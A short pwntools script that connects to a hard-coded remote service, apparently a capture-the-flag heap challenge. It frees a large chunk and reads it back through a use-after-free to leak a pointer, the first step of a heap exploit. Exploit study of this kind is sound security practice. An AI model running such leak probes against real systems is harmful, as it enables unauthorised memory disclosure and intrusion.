import re
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40838

def test_large():
    io = remote(HOST, PORT, timeout=8)
    def menu(c): io.sendlineafter(b"> ", str(c).encode())
    def create(idx, size, data):
        menu(1)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendlineafter(b"Size: ", str(size).encode())
        io.sendafter(b"Data: ", data)
    def readn(idx, n):
        menu(2)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.recvuntil(b"Data: ")
        return io.recvn(n)
    def delete(idx):
        menu(4)
        io.sendlineafter(b"Index: ", str(idx).encode())

    # Size 1300 (0x514 <= 0x520 max)
    create(0, 1300, b"A" * 1300)
    create(1, 32, b"B" * 32)
    delete(0)
    res = readn(0, 32)
    print("Size 1300 read hex:", res.hex())
    u = u64(res[:8])
    print("u64 val:", hex(u))
    io.close()

if __name__ == "__main__":
    test_large()
